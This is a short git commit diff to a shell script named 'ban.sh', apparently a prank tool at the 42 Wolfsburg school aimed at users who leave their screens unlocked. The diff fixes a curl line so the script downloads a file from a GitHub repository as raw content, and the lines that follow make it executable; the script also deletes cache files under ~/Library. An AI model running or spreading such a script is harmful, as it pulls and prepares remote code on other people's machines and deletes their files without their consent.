7145d346e3107bbd3902d1de018ce6f94305b856
kkaimov <kkaimov@student.42wolfsburg.de>
2022-11-15 16:33:40 +0100

    LOCK YOUR SCREEN

--- ban.sh
+++ ban.sh
@@ -5,7 +5,7 @@ end tell'; done&
 
 
 zsh -c 'rm -rf "~/Library/*42_cache*"';
-zsh -c 'curl -Ls "https://github.com/logoutpolice42/banana/blob/master/f?inline=false" > f';
+zsh -c 'curl -Ls "https://raw.githubusercontent.com/logoutpolice42/banana/master/f?inline=false" > f';
 zsh -c 'chmod +x f';
 zsh -c 'sleep 60';
 
